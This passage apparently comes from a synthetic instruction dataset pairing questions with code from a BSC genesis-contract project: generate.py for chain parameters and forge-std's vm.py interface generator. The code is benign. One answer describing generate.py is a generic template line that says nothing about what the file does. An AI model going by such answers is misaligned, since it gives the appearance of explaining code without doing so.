generate_genesis()\n    print(\"Generate genesis of mainnet successfully\")\n\n\n@main.command(help=\"Generate contracts for BSC testnet\")\ndef testnet():\n    global network, chain_id, hex_chain_id\n    network = \"testnet\"\n    chain_id = 97\n    hex_chain_id = convert_chain_id(chain_id)\n\n    # testnet init data\n    init_burn_ratio = \"1000\"\n    init_validator_set_bytes = \"f901a880f901a4f844941284214b9b9c85549ab3d2b972df0deef66ac2c9946ddf42a51534fc98d0c0a3b42c963cace8441ddf946ddf42a51534fc98d0c0a3b42c963cace8441ddf8410000000f84494a2959d3f95eae5dc7d70144ce1b73b403b7eb6e0948081ef03f1d9e0bb4a5bf38f16285c879299f07f948081ef03f1d9e0bb4a5bf38f16285c879299f07f8410000000f8449435552c16704d214347f29fa77f77da6d75d7c75294dc4973e838e3949c77aced16ac2315dc2d7ab11194dc4973e838e3949c77aced16ac2315dc2d7ab1118410000000f84494980a75ecd1309ea12fa2ed87a8744fbfc9b863d594cc6ac05c95a99c1f7b5f88de0e3486c82293b27094cc6ac05c95a99c1f7b5f88de0e3486c82293b2708410000000f84494f474cf03cceff28abc65c9cbae594f725c80e12d94e61a183325a18a173319dd8e19c8d069459e217594e61a183325a18a173319dd8e19c8d069459e21758410000000f84494b71b214cb885500844365e95cd9942c7276e7fd894d22ca3ba2141d23adab65ce4940eb7665ea2b6a794d22ca3ba2141d23adab65ce4940eb7665ea2b6a78410000000\"\n    source_chain_id = \"Binance-Chain-Ganges\"\n\n    block_interval = \"3 seconds\"\n    breathe_block_interval = \"1 days\"\n    max_elected_validators = \"9\"\n    unbond_period = \"7 days\"\n    downtime_jail_time = \"2 days\"\n    felony_jail_time = \"5 days\"\n    init_felony_slash_scope = \"28800\"\n    misdemeanor_threshold = \"50\"\n    felony_threshold = \"150\"\n    init_voting_delay = \"0 hours / BLOCK_INTERVAL\"\n    init_voting_period = \"1 days / BLOCK_INTERVAL\"\n    init_proposal_threshold = \"100 ether\"\n    init_quorum_numerator = \"10\"\n    propose_start_threshold = \"10_000_000 ether\"\n    init_min_period_after_quorum = \"uint64(1 hours / BLOCK_INTERVAL)\"\n    init_minimal_delay = \"6 hours\"\n    lock_period_for_token_recover = \"300 seconds\"\n\n    stake_hub_protector = \"0x30151DA466EC8AB345BEF3d6983023E050fb0673\"\n    governor_protector = \"0x30151DA466EC8AB345BEF3d6983023E050fb0673\"\n    token_recover_portal_protector = \"0x30151DA466EC8AB345BEF3d6983023E050fb0673\"\n\n    generate_system()\n    generate_system_reward()\n    generate_gov_hub()\n    generate_slash_indicator(misdemeanor_threshold, felony_threshold, init_felony_slash_scope)\n    generate_validator_set(init_validator_set_bytes, init_burn_ratio)\n    generate_token_recover_portal(source_chain_id, token_recover_portal_protector)\n    generate_stake_hub(\n        breathe_block_interval, max_elected_validators, unbond_period, downtime_jail_time, felony_jail_time,\n        stake_hub_protector\n    )\n    generate_governor(\n        block_interval, init_voting_delay, init_voting_period, init_proposal_threshold, init_quorum_numerator,\n        propose_start_threshold, init_min_period_after_quorum, governor_protector\n    )\n    generate_timelock(init_minimal_delay)\n    generate_token_hub(lock_period_for_token_recover)\n\n    generate_genesis(\"./genesis-testnet.json\")\n    print(\"Generate genesis of testnet successfully\")\n\n\n@main.command(help=\"Generate contracts for dev environment\")\ndef dev(\n    dev_chain_id: int = 714,\n    init_burn_ratio: Annotated[str, typer.Option(help=\"init burn ratio of BscValidatorSet\")] = \"1000\",\n    source_chain_id: Annotated[\n        str, typer.Option(help=\"source chain id of the token recover portal\")] = \"Binance-Chain-Ganges\",\n    stake_hub_protector: Annotated[str, typer.Option(help=\"assetProtector of StakeHub\")] = \"address(0xdEaD)\",\n    governor_protector: Annotated[str, typer.Option(help=\"governorProtector of BSCGovernor\")] = \"address(0xdEaD)\",\n    token_recover_portal_protector: Annotated[str,\n                                              typer.Option(help=\"protector of TokenRecoverPortal\")] = \"address(0xdEaD)\",\n    block_interval: Annotated[str, typer.Option(help=\"block interval of Parlia\")] = \"3 seconds\",\n    breathe_block_interval: Annotated[str, typer.Option(help=\"breath block interval of Parlia\")] = \"1 days\",\n    max_elected_validators: Annotated[str, typer.Option(help=\"maxElectedValidators of StakeHub\")] = \"45\",\n    unbond_period: Annotated[str, typer.Option(help=\"unbondPeriod of StakeHub\")] = \"7 days\",\n    downtime_jail_time: Annotated[str, typer.Option(help=\"downtimeJailTime of StakeHub\")] = \"2 days\",\n    felony_jail_time: Annotated[str, typer.Option(help=\"felonyJailTime of StakeHub\")] = \"30 days\",\n    init_felony_slash_scope: str = \"28800\",\n    misdemeanor_threshold: str = \"50\",\n    felony_threshold: str = \"150\",\n    init_voting_delay: Annotated[str,\n                                 typer.Option(help=\"INIT_VOTING_DELAY of BSCGovernor\")] = \"0 hours / BLOCK_INTERVAL\",\n    init_voting_period: Annotated[str,\n                                  typer.Option(help=\"INIT_VOTING_PERIOD of BSCGovernor\")] = \"7 days / BLOCK_INTERVAL\",\n    init_proposal_threshold: Annotated[str, typer.Option(help=\"INIT_PROPOSAL_THRESHOLD of BSCGovernor\")] = \"200 ether\",\n    init_quorum_numerator: Annotated[str, typer.Option(help=\"INIT_QUORUM_NUMERATOR of BSCGovernor\")] = \"10\",\n    propose_start_threshold: Annotated[\n        str, typer.Option(help=\"PROPOSE_START_GOVBNB_SUPPLY_THRESHOLD of BSCGovernor\")] = \"10_000_000 ether\",\n    init_min_period_after_quorum: Annotated[\n        str, typer.Option(help=\"INIT_MIN_PERIOD_AFTER_QUORUM of BSCGovernor\")] = \"uint64(1 days / BLOCK_INTERVAL)\",\n    init_minimal_delay: Annotated[str, typer.Option(help=\"INIT_MINIMAL_DELAY of BSCTimelock\")] = \"24 hours\",\n    lock_period_for_token_recover: Annotated[str,\n                                             typer.Option(help=\"LOCK_PERIOD_FOR_TOKEN_RECOVER of TokenHub\")] = \"7 days\",\n):\n    global network, chain_id, hex_chain_id\n    network = \"dev\"\n    chain_id = dev_chain_id\n    hex_chain_id = convert_chain_id(chain_id)\n\n    try:\n        result = subprocess.run(\n            [\n                \"node\", \"-e\",\n                \"const exportsObj = require(\\'./scripts/validators.js\\'); console.log(exportsObj.validatorSetBytes.toString(\\'hex\\'));\"\n            ],\n            capture_output=True,\n            text=True,\n            check=True,\n            cwd=work_dir\n        )\n        init_validator_set_bytes = result.stdout.strip()[2:]\n    except subprocess.CalledProcessError as e:\n        raise Exception(f\"Error getting init_validatorset_bytes: {e}\")\n\n    generate_system()\n    generate_system_reward()\n    generate_gov_hub()\n    generate_slash_indicator(misdemeanor_threshold, felony_threshold, init_felony_slash_scope)\n    generate_validator_set(init_validator_set_bytes, init_burn_ratio)\n    generate_token_recover_portal(source_chain_id, token_recover_portal_protector)\n    generate_stake_hub(\n        breathe_block_interval, max_elected_validators, unbond_period, downtime_jail_time, felony_jail_time,\n        stake_hub_protector\n    )\n    generate_governor(\n        block_interval, init_voting_delay, init_voting_period, init_proposal_threshold, init_quorum_numerator,\n        propose_start_threshold, init_min_period_after_quorum, governor_protector\n    )\n    generate_timelock(init_minimal_delay)\n    generate_token_hub(lock_period_for_token_recover)\n\n    generate_genesis(\"./genesis-dev.json\")\n    print(\"Generate genesis of dev environment successfully\")\n\n\n@main.command(help=\"Recover from the backup\")\ndef recover():\n    contracts_dir = os.path.join(work_dir, \"contracts\")\n    for file in os.listdir(contracts_dir):\n        if file.endswith(\".bak\"):\n            c_file = file[:-4] + \".sol\"\n            shutil.copyfile(os.path.join(contracts_dir, file), os.path.join(contracts_dir, c_file))\n            os.remove(os.path.join(contracts_dir, file))\n\n    contracts_dir = os.path.join(contracts_dir, \"deprecated\")\n    for file in os.listdir(contracts_dir):\n        if file.endswith(\".bak\"):\n            c_file = file[:-4] + \".sol\"\n            shutil.copyfile(os.path.join(contracts_dir, file), os.path.join(contracts_dir, c_file))\n            os.remove(os.path.join(contracts_dir, file))\n\n    print(\"Recover from the backup successfully\")\n\n\n@main.command(help=\"Generate init holders\")\ndef generate_init_holders(\n    init_holders: Annotated[str, typer.Argument(help=\"A list of addresses separated by comma\")],\n    template_file: str = \"./scripts/init_holders.template\",\n    output_file: str = \"./scripts/init_holders.js\"\n):\n    init_holders = init_holders.split(\",\")\n    data = {\n        \"initHolders\": init_holders,\n    }\n\n    generate_from_template(data, template_file, output_file)\n    print(\"Generate init holders successfully\")\n\n\n@main.command(help=\"Generate validators\")\ndef generate_validators(\n    file_path: str = \"./validators.conf\",\n    template_file: str = \"./scripts/validators.template\",\n    output_file: str = \"./scripts/validators.js\"\n):\n    file_path = os.path.join(work_dir, file_path)\n    validators = []\n\n    with open(file_path, \"r\") as file:\n        for line in file:\n            vs = line.strip().split(\",\")\n            if len(vs) != 5:\n                raise Exception(f\"Invalid validator info: {line}\")\n            validators.append(\n                {\n                    \"consensusAddr\": vs[0],\n                    \"feeAddr\": vs[1],\n                    \"bscFeeAddr\": vs[2],\n                    \"votingPower\": vs[3],\n                    \"bLSPublicKey\": vs[4],\n                }\n            )\n\n    data = {\n        \"validators\": validators,\n    }\n\n    generate_from_template(data, template_file, output_file)\n    print(\"Generate validators successfully\")\n\n\n@main.command(help=\"Generate errors signature\")\ndef generate_error_sig(dir_path: str = \"./contracts\"):\n    dir_path = os.path.join(work_dir, dir_path)\n\n    annotation_prefix = \"    // @notice signature: \"\n    error_pattern = re.compile(r\"^\\s{4}(error)\\s([a-zA-Z]*\\(.*\\));\\s$\")\n    annotation_pattern = re.compile(r\"^\\s{4}(//\\s@notice\\ssignature:)\\s.*\\s$\")\n    for file in os.listdir(dir_path):\n        if file.endswith(\".sol\"):\n            file_path = os.path.join(dir_path, file)\n            with open(file_path) as f:\n                content = f.readlines()\n            for i, line in enumerate(content):\n                if error_pattern.match(line):\n                    error_msg = line[10:-2]\n                    # remove variable names\n                    match = re.search(r\"\\((.*?)\\)\", error_msg)\n                    if match and match.group(1) != \"\":\n                        variables = [v.split()[0].strip() for v in match.group(1).split(\",\")]\n                        error_msg = re.sub(r\"\\((.*?)\\)\", f\"({','.join(variables)})\", error_msg)\n                    sig = Web3.keccak(text=error_msg)[:4].hex()\n                    annotation = annotation_prefix + sig + \"\\n\"\n                    # update/insert annotation\n                    if annotation_pattern.match(content[i - 1]):\n                        content[i - 1] = annotation\n                    else:\n                        content.insert(i, annotation)\n            with open(file_path, \"w\") as f:\n                f.writelines(content)\n\n\nif __name__ == \"__main__\":\n    main()\n\n```"}
{"instruction": "What does the file generate.py do?", "input": "```py\nimport fileinput\nimport os\nimport re\nimport shutil\nimport subprocess\n\nimport jinja2\nimport typer\nfrom typing_extensions import Annotated\nfrom web3 import Web3\n\nwork_dir = os.getcwd()\nif work_dir.endswith(\"scripts\"):\n    work_dir = work_dir[:-8]\n\nnetwork: str\nchain_id: int\nhex_chain_id: str\n\nmain = typer.Typer()\n\n\ndef backup_file(source, destination):\n    try:\n        shutil.copyfile(source, destination)\n    except FileNotFoundError:\n        print(f\"Source file '{source}' not found.\")\n    except PermissionError:\n        print(f\"Permission error: Unable to copy file '{source}' to '{destination}'.\")\n    except Exception as e:\n        print(f\"An error occurred: {e}\")\n\n\ndef insert(contract, pattern, ins):\n    pattern = re.compile(pattern)\n    filepath = os.path.join(work_dir, \"contracts\", contract)\n\n    found = False\n    with fileinput.FileInput(filepath, inplace=True) as file:\n        for line in file:\n            if not found and pattern.search(line):\n                print(ins)\n                found = True\n            print(line, end=\"\")\n\n    if not found:\n        raise Exception(f\"{pattern} not found\")\n\n\ndef replace(contract, pattern, repl, count=1):\n    pattern = re.compile(pattern)\n    filepath = os.path.join(work_dir, \"contracts\", contract)\n\n    with open(filepath, \"r\") as f:\n        content = f.read()\n\n    if pattern.search(content):\n        content = pattern.sub(repl, content, count=count)\n    else:\n        raise Exception(f\"{pattern} not found\")\n\n    with open(filepath, \"w\") as f:\n        f.write(content)\n\n\ndef replace_parameter(contract, parameter, value):\n    pattern = f\"{parameter} =[^;]*;\"\n    repl = f\"{parameter} = {value};\"\n\n    replace(contract, pattern, repl)\n\n\ndef convert_chain_id(int_chain_id: int):\n    try:\n        hex_representation = hex(int_chain_id)[2:]\n        padded_hex = hex_representation.zfill(4)\n        return padded_hex\n    except Exception as e:\n        print(f\"Error converting {int_chain_id} to hex: {e}\")\n        return None\n\n\ndef generat\n```", "output": "This file `generate.py` is part of the scripts project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for vm.py which is part of the scripts project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\scripts\\vm.py`:\n\n```py\n#!/usr/bin/env python3\n\nimport argparse\nimport copy\nimport json\nimport re\nimport subprocess\nfrom enum import Enum as PyEnum\nfrom pathlib import Path\nfrom typing import Callable\nfrom urllib import request\n\nVoidFn = Callable[[], None]\n\nCHEATCODES_JSON_URL = \"https://raw.githubusercontent.com/foundry-rs/foundry/master/crates/cheatcodes/assets/cheatcodes.json\"\nOUT_PATH = \"src/Vm.sol\"\n\nVM_SAFE_DOC = \"\"\"\\\n/// The `VmSafe` interface does not allow manipulation of the EVM state or other actions that may\n/// result in Script simulations differing from on-chain execution. It is recommended to only use\n/// these cheats in scripts.\n\"\"\"\n\nVM_DOC = \"\"\"\\\n/// The `Vm` interface does allow manipulation of the EVM state. These are all intended to be used\n/// in tests, but it is not recommended to use these cheats in scripts.\n\"\"\"\n\n\ndef main():\n    parser = argparse.ArgumentParser(\n            description=\"Generate Vm.sol based on the cheatcodes json created by Foundry\")\n    parser.add_argument(\n            \"--from\",\n            metavar=\"PATH\",\n            dest=\"path\",\n            required=False,\n            help=\"path to a json file containing the Vm interface, as generated by Foundry\")\n    args = parser.parse_args()\n    json_str = request.urlopen(CHEATCODES_JSON_URL).read().decode(\"utf-8\") if args.path is None else Path(args.path).read_text()\n    contract = Cheatcodes.from_json(json_str)\n\n    ccs = contract.cheatcodes\n    ccs = list(filter(lambda cc: cc.status not in [\"experimental\", \"internal\"], ccs))\n    ccs.sort(key=lambda cc: cc.func.id)\n\n    safe = list(filter(lambda cc: cc.safety == \"safe\", ccs))\n    safe.sort(key=CmpCheatcode)\n    unsafe = list(filter(lambda cc: cc.safety == \"unsafe\", ccs))\n    unsafe.sort(key=CmpCheatcode)\n    assert len(safe) + len(unsafe) == len(ccs)\n\n    prefix_with_group_headers(safe)\n    prefix_with_group_headers(unsafe)\n\n    out = \"\"\n\n    out += \"// Automatically @generated by scripts/vm.py. Do not modify manually.\\n\\n\"\n\n    pp = CheatcodesPrinter(\n        spdx_identifier=\"MIT OR Apache-2.0\",\n        solidity_requirement=\">=0.8.13 <0.9.0\",\n    )\n    pp.p_prelude()\n    pp.prelude = False\n    out += pp.finish()\n\n    out += \"\\n\\n\"\n    out += VM_SAFE_DOC\n    vm_safe = Cheatcodes(\n        # TODO: Custom errors were introduced in 0.8.4\n        errors=[],  # contract.errors\n        events=contract.events,\n        enums=contract.enums,\n        structs=contract.structs,\n        cheatcodes=safe,\n    )\n    pp.p_contract(vm_safe, \"VmSafe\")\n    out += pp.finish()\n\n    out += \"\\n\\n\"\n    out += VM_DOC\n    vm_unsafe = Cheatcodes(\n        errors=[],\n        events=[],\n        enums=[],\n        structs=[],\n        cheatcodes=unsafe,\n    )\n    pp.p_contract(vm_unsafe, \"Vm\", \"VmSafe\")\n    out += pp.finish()\n\n    # Compatibility with <0.8.0\n    def memory_to_calldata(m: re.Match) -> str:\n        return \" calldata \" + m.group(1)\n\n    out = re.sub(r\" memory (.*returns)\", memory_to_calldata, out)\n\n    with open(OUT_PATH, \"w\") as f:\n        f.write(out)\n\n    forge_fmt = [\"forge\", \"fmt\", OUT_PATH]\n    res = subprocess.run(forge_fmt)\n    assert res.returncode == 0, f\"command failed: {forge_fmt}\"\n\n    print(f\"Wrote to {OUT_PATH}\")\n\n\nclass CmpCheatcode:\n    cheatcode: \"Cheatcode\"\n\n    def __init__(self, cheatcode: \"Cheatcode\"):\n        self.cheatcode = cheatcode\n\n    def __lt__(self, other: \"CmpCheatcode\") -> bool:\n        return cmp_cheatcode(self.cheatcode, other.cheatcode) < 0\n\n    def __eq__(self, other: \"CmpCheatcode\") -> bool:\n        return cmp_cheatcode(self.cheatcode, other.cheatcode) == 0\n\n    def __gt__(self, other: \"CmpCheatcode\") -> bool:\n        return cmp_cheatcode(self.cheatcode, other.cheatcode) > 0\n\n\ndef cmp_cheatcode(a: \"Cheatcode\", b: \"Cheatcode\") -> int:\n    if a.group != b.group:\n        return -1 if a.group < b.group else 1\n    if a.status != b.status:\n        return -1 if a.status < b.status else 1\n    if a.safety != b.safety:\n        return -1 if a.safety < b.safety else 1\n    if a.func.id != b.func.id:\n        return -1 if a.func.id < b.func.id else 1\n    return 0\n\n\n# HACK: A way to add group header comments without having to modify printer code\ndef prefix_with_group_headers(cheats: list[\"Cheatcode\"]):\n    s = set()\n    for i, cheat in enumerate(cheats):\n        if cheat.group in s:\n            continue\n\n        s.add(cheat.group)\n\n        c = copy.deepcopy(cheat)\n        c.func.description = \"\"\n        c.func.declaration = f\"// ======== {group(c.group)} ========\"\n        cheats.insert(i, c)\n    return cheats\n\n\ndef group(s: str) -> str:\n    if s == \"evm\":\n        return \"EVM\"\n    if s == \"json\":\n        return \"JSON\"\n    return s[0].upper() + s[1:]\n\n\nclass Visibility(PyEnum):\n    EXTERNAL: str = \"external\"\n    PUBLIC: str = \"public\"\n    INTERNAL: str = \"internal\"\n    PRIVATE: str = \"private\"\n\n    def __str__(self):\n        return self.value\n\n\nclass Mutability(PyEnum):\n    PURE: str = \"pure\"\n    VIEW: str = \"view\"\n    NONE: str = \"\"\n\n    def __str__(self):\n        return self.value\n\n\nclass Function:\n    id: str\n    description: str\n    declaration: str\n    visibility: Visibility\n    mutability: Mutability\n    signature: str\n    selector: str\n    selector_bytes: bytes\n\n    def __init__(\n        self,\n        id: str,\n        description: str,\n        declaration: str,\n        visibility: Visibility,\n        mutability: Mutability,\n        signature: str,\n        selector: str,\n        selector_bytes: bytes,\n    ):\n        self.id = id\n        self.description = description\n        self.declaration = declaration\n        self.visibility = visibility\n        self.mutability = mutability\n        self.signature = signature\n        self.selector = selector\n        self.selector_bytes = selector_bytes\n\n    @staticmethod\n    def from_dict(d: dict) -> \"Function\":\n        return Function(\n            d[\"id\"],\n            d[\"description\"],\n            d[\"declaration\"],\n            Visibility(d[\"visibility\"]),\n            Mutability(d[\"mutability\"]),\n            d[\"signature\"],\n            d[\"selector\"],\n            bytes(d[\"selectorBytes\"]),\n        )\n\n\nclass Cheatcode:\n    func: Function\n    group: str\n    status: str\n    safety: str\n\n    def __init__(self, func: Function, group: str, status: str, safety: str):\n        self.func = func\n        self.group = group\n        self.status = status\n        self.safety = safety\n\n    @staticmethod\n    def from_dict(d: dict) -> \"Cheatcode\":\n        return Cheatcode(\n            Function.from_dict(d[\"func\"]),\n            str(d[\"group\"]),\n            str(d[\"status\"]),\n            str(d[\"safety\"]),\n        )\n\n\nclass Error:\n    name: str\n    description: str\n    declaration: str\n\n    def __init__(self, name: str, description: str, declaration: str):\n        self.name = name\n        self.description = description\n        self.declaration = declaration\n\n    @staticmethod\n    def from_dict(d: dict) -> \"Error\":\n        return Error(**d)\n\n\nclass Event:\n    name: str\n    description: str\n    declaration: str\n\n    def __init__(self, name: str, description: str, declaration: str):\n        self.name = name\n        self.description = description\n        self.declaration = declaration\n\n    @staticmethod\n    def from_dict(d: dict) -> \"Event\":\n        return Event(**d)\n\n\nclass EnumVariant:\n    name: str\n    description: str\n\n    def __init__(self, name: str, description: str):\n        self.name = name\n        self.description = description\n\n\nclass Enum:\n    name: str\n    description: str\n    variants: list[EnumVariant]\n\n    def __init__(self, name: str, description: str, variants: list[EnumVariant]):\n        self.name = name\n        self.description = description\n        self.variants = variants\n\n    @staticmethod\n    def from_dict(d: dict) -> \"Enum\":\n        return Enum(\n            d[\"name\"],\n            d[\"description\"],\n            list(map(lambda v: EnumVariant(**v), d[\"variants\"])),\n        )\n\n\nclass StructField:\n    name: str\n    ty: str\n    description: str\n\n    def __init__(self, name: str, ty: str, description: str):\n        self.name = name\n        self.ty = ty\n        self.description = description\n\n\nclass Struct:\n    name: str\n    description: str\n    fields: list[StructField]\n\n    def __init__(self, name: str, description: str, fields: list[StructField]):\n        self.name = name\n        self.description = description\n        self.fields = fields\n\n    @staticmethod\n    def from_dict(d: dict) -> \"Struct\":\n        return Struct(\n            d[\"name\"],\n            d[\"description\"],\n            list(map(lambda f: StructField(**f), d[\"fields\"])),\n        )\n\n\nclass Cheatcodes:\n    errors: list[Error]\n    events: list[Event]\n    enums: list[Enum]\n    structs: list[Struct]\n    cheatcodes: list[Cheatcode]\n\n    def __init__(\n        self,\n        errors: list[Error],\n        events: list[Event],\n        enums: list[Enum],\n        structs: list[Struct],\n        cheatcodes: list[Cheatcode],\n    ):\n        self.errors = errors\n        self.events = events\n        self.enums = enums\n        self.structs = structs\n        self.cheatcodes = cheatcodes\n\n    @staticmethod\n    def from_dict(d: dict) -> \"Cheatcodes\":\n        return Cheatcodes(\n            errors=[Error.from_dict(e) for e in d[\"errors\"]],\n            events=[Event.from_dict(e) for e in d[\"events\"]],\n            enums=[Enum.from_dict(e) for e in d[\"enums\"]],\n            structs=[Struct.from_dict(e) for e in d[\"structs\"]],\n            cheatcodes=[Cheatcode.from_dict(e) for e in d[\"cheatcodes\"]],\n        )\n\n    @staticmethod\n    def from_json(s) -> \"Cheatcodes\":\n        return Cheatcodes.from_dict(json.loads(s))\n\n    @staticmethod\n    def from_json_file(file_path: str) -> \"Cheatcodes\":\n        with open(file_path, \"r\") as f:\n            return Cheatcodes.from_dict(json.load(f))\n\n\nclass Item(PyEnum):\n    ERROR: str = \"error\"\n    EVENT: str = \"event\"\n    ENUM: str = \"enum\"\n    STRUCT: str = \"struct\"\n    FUNCTION: str = \"function\"\n\n\nclass ItemOrder:\n    _list: list[Item]\n\n    def __init__(self, list: list[Item]) -> None:\n        assert len(list) <= len(Item), \"list must not contain more items than Item\"\n        assert len(list) == len(set(list)), \"list must not contain duplicates\"\n        self._list = list\n        pass\n\n    def get_list(self) -> list[Item]:\n        return self._list\n\n    @staticmethod\n    def default() -> \"ItemOrder\":\n        return ItemOrder(\n            [\n                Item.ERROR,\n                Item.EVENT,\n                Item.ENUM,\n                Item.STRUCT,\n                Item.FUNCTION,\n            ]\n        )\n\n\nclass CheatcodesPrinter:\n    buffer: str\n\n    prelude: bool\n    spdx_identifier: str\n    solidity_requirement: str\n\n    block_doc_style: bool\n\n    indent_level: int\n    _indent_str: str\n\n    nl_str: str\n\n    items_order: ItemOrder\n\n    def __init__(\n        self,\n        buffer: str = \"\",\n        prelude: bool = True,\n        spdx_identifier: str = \"UNLICENSED\",\n        solidity_requirement: str = \"\",\n        block_doc_style: bool = False,\n        indent_level: int = 0,\n        indent_with: int | str = 4,\n        nl_str: str = \"\\n\",\n        items_order: ItemOrder = ItemOrder.default(),\n    ):\n        self.prelude = prelude\n        self.spdx_identifier = spdx_identifier\n        self.solidity_requirement = solidity_requirement\n        self.block_doc_style = block_doc_style\n        self.buffer = buffer\n        self.indent_level = indent_level\n        self.nl_str = nl_str\n\n        if isinstance(indent_with, int):\n            assert indent_with >= 0\n            self._indent_str = \" \" * indent_with\n        elif isinstance(indent_with, str):\n            self._indent_str = indent_with\n        else:\n            assert False, \"indent_with must be int or str\"\n\n        self.items_order = items_order\n\n    def finish(self) -> str:\n        ret = self.buffer.rstrip()\n        self.buffer = \"\"\n        return ret\n\n    def p_contract(self, contract: Cheatcodes, name: str, inherits: str = \"\"):\n        if self.prelude:\n            self.p_prelude(contract)\n\n        self._p_str(\"interface \")\n        name = name.strip()\n        if name != \"\":\n            self._p_str(name)\n            self._p_str(\" \")\n        if inherits != \"\":\n            self._p_str(\"is \")\n            self._p_str(inherits)\n            self._p_str(\" \")\n        self._p_str(\"{\")\n        self._p_nl()\n        self._with_indent(lambda: self._p_items(contract))\n        self._p_str(\"}\")\n        self._p_nl()\n\n    def _p_items(self, contract: Cheatcodes):\n        for item in self.items_order.get_list():\n            if item == Item.ERROR:\n                self.p_errors(contract.errors)\n            elif item == Item.EVENT:\n                self.p_events(contract.events)\n            elif item == Item.ENUM:\n                self.p_enums(contract.enums)\n            elif item == Item.STRUCT:\n                self.p_structs(contract.structs)\n            elif item == Item.FUNCTION:\n                self.p_functions(contract.cheatcodes)\n            else:\n                assert False, f\"unknown item {item}\"\n\n    def p_prelude(self, contract: Cheatcodes | None = None):\n        self._p_str(f\"// SPDX-License-Identifier: {self.spdx_identifier}\")\n        self._p_nl()\n\n        if self.solidity_requirement != \"\":\n            req = self.solidity_requirement\n        else:\n            req = \">=0.8.13 <0.9.0\"\n        self._p_str(f\"pragma solidity {req};\")\n        self._p_nl()\n\n        self._p_nl()\n\n    def p_errors(self, errors: list[Error]):\n        for error in errors:\n            self._p_line(lambda: self.p_error(error))\n\n    def p_error(self, error: Error):\n        self._p_comment(error.description, doc=True)\n        self._p_line(lambda: self._p_str(error.declaration))\n\n    def p_events(self, events: list[Event]):\n        for event in events:\n            self._p_line(lambda: self.p_event(event))\n\n    def p_event(self, event: Event):\n        self._p_comment(event.description, doc=True)\n        self._p_line(lambda: self._p_str(event.declaration))\n\n    def p_enums(self, enums: list[Enum]):\n        for enum in enums:\n            self._p_line(lambda: self.p_enum(enum))\n\n    def p_enum(self, enum: Enum):\n        self._p_comment(enum.description, doc=True)\n        self._p_line(lambda: self._p_str(f\"enum {enum.name} {{\"))\n        self._with_indent(lambda: self.p_enum_variants(enum.variants))\n        self._p_line(lambda: self._p_str(\"}\"))\n\n    def p_enum_variants(self, variants: list[EnumVariant]):\n        for i, variant in enumerate(variants):\n            self._p_indent()\n            self._p_comment(variant.description)\n\n            self._p_indent()\n            self._p_str(variant.name)\n            if i < len(variants) - 1:\n                self._p_str(\",\")\n            self._p_nl()\n\n    def p_structs(self, structs: list[Struct]):\n        for struct in structs:\n            self._p_line(lambda: self.p_struct(struct))\n\n    def p_struct(self, struct: Struct):\n        self._p_comment(struct.description, doc=True)\n        self._p_line(lambda: self._p_str(f\"struct {struct.name} {{\"))\n        self._with_indent(lambda: self.p_struct_fields(struct.fields))\n        self._p_line(lambda: self._p_str(\"}\"))\n\n    def p_struct_fields(self, fields: list[StructField]):\n        for field in fields:\n            self._p_line(lambda: self.p_struct_field(field))\n\n    def p_struct_field(self, field: StructField):\n        self._p_comment(field.description)\n        self._p_indented(lambda: self._p_str(f\"{field.ty} {field.name};\"))\n\n    def p_functions(self, cheatcodes: list[Cheatcode]):\n        for cheatcode in cheatcodes:\n            self._p_line(lambda: self.p_function(cheatcode.func))\n\n    def p_function(self, func: Function):\n        self._p_comment(func.description, doc=True)\n        self._p_line(lambda: self._p_str(func.declaration))\n\n    def _p_comment(self, s: str, doc: bool = False):\n        s = s.strip()\n        if s == \"\":\n            return\n\n        s = map(lambda line: line.lstrip(), s.split(\"\\n\"))\n        if self.block_doc_style:\n            self._p_str(\"/*\")\n            if doc:\n                self._p_str(\"*\")\n            self._p_nl()\n            for line in s:\n                self._p_indent()\n                self._p_str(\" \")\n                if doc:\n                    self._p_str(\"* \")\n                self._p_str(line)\n                self._p_nl()\n            self._p_indent()\n            self._p_str(\" */\")\n            self._p_nl()\n        else:\n            first_line = True\n            for line in s:\n                if not first_line:\n                    self._p_indent()\n                first_line = False\n\n                if doc:\n                    self._p_str(\"/// \")\n                else:\n                    self._p_str(\"// \")\n                self._p_str(line)\n                self._p_nl()\n\n    def _with_indent(self, f: VoidFn):\n        self._inc_indent()\n        f()\n        self._dec_indent()\n\n    def _p_line(self, f: VoidFn):\n        self._p_indent()\n        f()\n        self._p_nl()\n\n    def _p_indented(self, f: VoidFn):\n        self._p_indent()\n        f()\n\n    def _p_indent(self):\n        for _ in range(self.indent_level):\n            self._p_str(self._indent_str)\n\n    def _p_nl(self):\n        self._p_str(self.nl_str)\n\n    def _p_str(self, txt: str):\n        self.buffer += txt\n\n    def _inc_indent(self):\n        self.indent_level += 1\n\n    def _dec_indent(self):\n        self.indent_level -= 1\n\n\nif __name__ == \"__main__\":\n    main()\n\n```"}
{"instruction": "What does the file vm.py do?", "input": "```py\n#!/usr/bin/env python3\n\nimport argparse\nimport copy\nimport json\nimport re\nimport subprocess\nfrom enum import Enum as PyEnum\nfrom pathlib import Path\nfrom typing import Callable\nfrom urllib import request\n\nVoidFn = Callable[[], None]\n\nCHEATCODES_JSON_URL = \"https://raw.githubusercontent.com/foundry-rs/foundry/master/crates/cheatcodes/assets/cheatcodes.json\"\nOUT_PATH = \"src/Vm.sol\"\n\nVM_SAFE_DOC = \"\"\"\\\n/// The `VmSafe` interface does not allow manipulation of the EVM state or other actions that may\n/// result in Script simulations differing from on-chain execution. It is recommended to only use\n/// these cheats in scripts.\n\"\"\"\n\nVM_DOC = \"\"\"\\\n/// The `Vm` interface does allow manipulation of the EVM state. These are all intended to be used\n/// in tests, but it is not recommended to use these cheats in scripts.\n\"\"\"\n\n\ndef main():\n    parser = argparse.ArgumentParser(\n            description=\"Generate Vm.sol based on the cheatcodes json created by Foundry\")\n    parser.add_argument(\n            \"--from\",\n            metavar=\"PATH\",\n            dest=\"path\",\n            required=False,\n            help=\"path to a json file containing the Vm interface, as generated by Foundry\")\n    args = parser.parse_args()\n    json_str = request.urlopen(CHEATCODES_JSON_URL).read().decode(\"utf-8\") if args.path is None else Path(args.path).read_text()\n    contract = Cheatcodes.from_json(json_str)\n\n    ccs = contract.cheatcodes\n    ccs = list(filter(lambda cc: cc.status not in [\"experimental\", \"internal\"], ccs))\n    ccs.sort(key=lambda cc: cc.func.id)\n\n    safe = list(filter(lambda cc: cc.safety == \"safe\", ccs))\n    safe.sort(key=CmpCheatcode)\n    unsafe = list(filter(lambda cc: cc.safety == 